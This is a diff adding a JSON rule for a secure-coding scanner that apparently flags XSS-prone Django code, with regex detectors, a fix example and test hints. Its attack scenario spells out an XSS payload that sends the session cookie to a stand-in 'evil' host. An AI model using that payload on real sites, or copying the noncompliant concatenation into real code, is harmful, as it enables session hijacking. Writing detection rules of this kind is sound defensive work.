@@ -1,0 +1,44 @@
+{
+  "cwe_id": "CWE-79",
+  "name": "Django HTML-escaping bypass (format_html / HttpResponse)",
+  "rank": 0,
+  "kev": false,
+  "task_triggers": [
+    "render",
+    "html",
+    "template",
+    "response",
+    "comment",
+    "profile",
+    "email",
+    "widget",
+    "admin"
+  ],
+  "patterns": [
+    {
+      "lang": "python",
+      "confidence": "high",
+      "re": "format_html\\(\\s*f[\"']"
+    },
+    {
+      "lang": "python",
+      "confidence": "high",
+      "re": "format_html\\(\\s*[\"'][^\"']*[\"']\\s*(?:%|\\+|\\.format\\()"
+    },
+    {
+      "lang": "python",
+      "confidence": "medium",
+      "re": "HttpResponse\\(\\s*(?:f[\"']|[^,)]*\\+)",
+      "reject_re": "content_type\\s*=\\s*[\"'](?:application/json|text/plain|text/csv)|JsonResponse"
+    }
+  ],
+  "attack_scenario": "username = \"<img src=x onerror=fetch('//evil/'+document.cookie)>\" is echoed live into the page; it runs under the site origin in every viewer's browser and exfiltrates their session cookie.",
+  "negative_test_hint": [
+    "submit username = \"<img src=x onerror=alert(1)>\" and assert the response HTML-escapes it rather than reflecting it as live markup"
+  ],
+  "exemplar": {
+    "noncompliant": "return HttpResponse(\"<b>Hi \" + username + \"</b>\")",
+    "compliant": "return render(request, \"greet.html\", {\"username\": username})",
+    "explanation": "format_html() only escapes the values passed as its positional/keyword args — it trusts the format string itself. Pre-building that string with an f-string, %, +, or .format() smuggles unescaped user data past the escaping and returns a SafeString; passing data as args, as in format_html('<b>{}</b>', value), keeps it escaped. HttpResponse defaults to Content-Type text/html, so concatenating user input into its body is reflected XSS; rendering through a template keeps auto-escaping on."
+  }
+}
